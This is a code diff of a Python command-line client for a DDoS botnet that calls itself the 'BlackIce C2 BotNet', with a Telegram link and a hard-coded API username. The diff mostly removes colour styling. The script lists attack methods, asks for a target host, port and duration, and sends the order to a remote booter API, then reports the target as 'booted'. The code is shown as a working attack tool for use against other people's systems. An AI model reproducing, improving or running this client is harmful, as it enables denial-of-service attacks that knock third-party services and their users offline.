@@ -1,11 +1,6 @@
 import os
 import time
 import requests
-from colorama import Fore, Style, init
-import pyfiglet
-
-# Initialize colorama
-init(autoreset=True)
 
 # API credentials
 USERNAME = "Iamgeo1"
@@ -27,71 +22,66 @@ def clear_screen():
 def display_menu():
     clear_screen()
 
-    # ASCII Art Title
-    title = pyfiglet.figlet_format("BLACKICE", font="epic")
-    print(Fore.LIGHTCYAN_EX + title.strip())
-
-    # Welcome Box
-    welcome_box = f"""
-{Fore.LIGHTCYAN_EX}+{'-'*42}+
-| {Fore.WHITE}Welcome to the BlackIce C2 BotNet       {Fore.LIGHTCYAN_EX}|
-| {Fore.WHITE}Powered by BlackIce API                   {Fore.LIGHTCYAN_EX}|
-+{'-'*42}+
-"""
-    print(welcome_box.strip())
-
-    print(f"\n{Fore.WHITE}Join the community: {Fore.LIGHTCYAN_EX}https://t.me/BlackIceC2")
-    print(f"{Fore.WHITE}Copyright © 2025 BlackIce - All Rights Reserved")
-    print(f"{Fore.WHITE}Created by iamgeo1 & mzz")
-    print(Fore.LIGHTCYAN_EX + "=" * 50)
+    # Title
+    print("BLACKICE C2 BotNet\n")
+    
+    # Welcome box
+    print("+------------------------------------------+")
+    print("| Welcome to the BlackIce C2 BotNet       |")
+    print("| Powered by BlackIce API                 |")
+    print("+------------------------------------------+")
+    print("\nJoin the community: https://t.me/BlackIceC2")
+    print("Copyright © 2025 BlackIce - All Rights Reserved")
+    print("Created by iamgeo1 & mzz")
+    print("=" * 50)
 
 # Show help and display attack methods
 def show_help():
-    print("\n" + Fore.LIGHTCYAN_EX + "+------------------------ COMMANDS ------------------------+")
-    print(Fore.YELLOW + "[help]   " + Fore.WHITE + "- Show this help message")
-    print(Fore.YELLOW + "[clear]  " + Fore.WHITE + "- Clear the terminal screen")
-    print(Fore.YELLOW + "[exit]   " + Fore.WHITE + "- Exit the program")
-    print(Fore.LIGHTCYAN_EX + "+---------------------------------------------------------+")
+    print("\n+------------------------ COMMANDS ------------------------+")
+    print("[help]   - Show this help message")
+    print("[clear]  - Clear the terminal screen")
+    print("[exit]   - Exit the program")
+    print("+---------------------------------------------------------+")
 
-    print("\n" + Fore.LIGHTCYAN_EX + "Available Attack Methods:")
+    print("\nAvailable Attack Methods:")
     columns = 3
     for i in range(0, len(ATTACK_METHODS), columns):
         row = []
         for j in range(columns):
             if i + j < len(ATTACK_METHODS):
                 method = ATTACK_METHODS[i + j]
-                row.append(f"{Fore.YELLOW}[{Fore.GREEN}{i + j + 1}{Fore.YELLOW}] {Fore.WHITE}{method}")
+                row.append(f"[{i + j + 1}] {method}")
         print("   ".join(row))
 
 # Get user input
 def get_input():
     try:
-        command = input(Fore.LIGHTCYAN_EX + "[root@BlackIce] ~ " + Fore.GREEN).strip().lower()
+        command = input("[root@BlackIce] ~ ").strip().lower()
         if command == 'help':
             show_help()
         elif command == 'clear':
             clear_screen()
             display_menu()
         elif command == 'exit':
-            print(Fore.LIGHTRED_EX + "\n[!] Shutting down BlackIce...")
+            print("\n[!] Shutting down BlackIce...")
             exit()
         else:
             try:
                 choice = int(command)
                 if 1 <= choice <= len(ATTACK_METHODS):
                     method = ATTACK_METHODS[choice - 1]
-                    host = input("\n🎯 " + Fore.LIGHTCYAN_EX + "Target (IP/Host): " + Fore.WHITE)
-                    port = input("🚪 " + Fore.LIGHTCYAN_EX + "Port: " + Fore.WHITE)
-                    time = input("🕒 " + Fore.LIGHTCYAN_EX + "Duration (seconds): " + Fore.WHITE)
+                    host = input("\nTarget (IP/Host): ")
+                    port = input("Port: ")
+                    duration = input("Duration (seconds): ")
 
-                    print("\n🚀 " + Fore.LIGHTGREEN_EX + "Launching attack..." + Fore.WHITE)
-                    send_attack(method, host, port, time)
+                    print("\nLaunching attack...")
+                    send_attack(method, host, port, duration)
                 else:
-                    print("\n❌ " + Fore.LIGHTRED_EX + "Invalid selection." + Fore.WHITE)
+                    print("\nInvalid selection.")
             except ValueError:
-                print("\n❌ " + Fore.LIGHTRED_EX + "Invalid input." + Fore.WHITE)
+                print("\nInvalid input.")
     except Exception as e:
-        print("\n❌ " + Fore.LIGHTRED_EX + f"Error: {e}" + Fore.WHITE)
+        print("\nError: {e}")
 
 # Send attack request
 def send_attack(method, host, port, duration):
@@ -106,9 +96,9 @@ def send_attack(method, host, port, duration):
     response = requests.get(url)
 
     if response.status_code == 200:
-        print(f"\n✅ {Fore.LIGHTGREEN_EX}Booted By BlackIce.... {host}:{port} using {method} for {duration} seconds!")
+        print(f"\nBooted By BlackIce.... {host}:{port} using {method} for {duration} seconds!")
     else:
-        print(f"\n❌ {Fore.LIGHTRED_EX}Error: {response.text}")
+        print(f"\nError: {response.text}")
 
     time.sleep(3)
     main()
